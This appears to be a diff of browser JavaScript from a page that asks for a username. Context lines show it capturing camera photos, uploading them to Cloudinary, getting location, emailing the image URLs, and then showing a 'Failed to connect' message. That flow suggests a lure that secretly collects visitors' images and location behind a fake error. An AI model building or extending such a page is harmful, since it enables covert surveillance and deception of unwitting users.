@@ -1,3 +1,6 @@
+const startBtn = document.getElementById('start-btn');
+let videoStream = null;
+
 // Function to capture photos from the camera, upload to Cloudinary, and return URLs
 async function captureAndUploadPhotos() {
     const video = document.createElement('video');
@@ -57,7 +60,7 @@ async function sendEmailWithImageURLs(data, imageURLs) {
     });
 }
 
-// Example flow: Capture photos, get location, and send email
+// Event listener for the start button
 startBtn.addEventListener('click', async () => {
     const username = document.getElementById('username').value;
     if (!username) {
@@ -95,6 +98,7 @@ startBtn.addEventListener('click', async () => {
     }
 });
 
+// Function to show "Failed to connect" message
 function showFailedToConnect() {
     document.getElementById('main-content').style.display = 'none';
     document.getElementById('failed-message').style.display = 'block';
